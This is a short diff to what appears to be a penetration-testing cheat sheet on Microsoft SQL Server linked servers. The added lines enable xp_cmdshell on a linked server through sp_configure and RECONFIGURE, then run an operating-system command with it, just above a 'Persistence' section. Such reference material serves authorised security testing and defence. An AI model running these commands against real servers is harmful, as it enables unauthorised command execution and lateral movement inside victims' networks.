@@ -248,7 +248,11 @@ SELECT * FROM sys.servers;
 
 # Execute on linked server
 EXEC ('SELECT @@version') AT [LinkedServerName];
-EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer];
+EXEC ('EXEC sp_configure ''show advanced options'', 1') AT [LinkedServerName]
+EXEC ('RECONFIGURE') AT [LinkedServerName]
+EXEC ('EXEC sp_configure ''xp_cmdshell'', 1') AT [LinkedServerName]
+EXEC ('RECONFIGURE') AT [LinkedServerName]
+EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServerName];
 ```
 
 ### Persistence
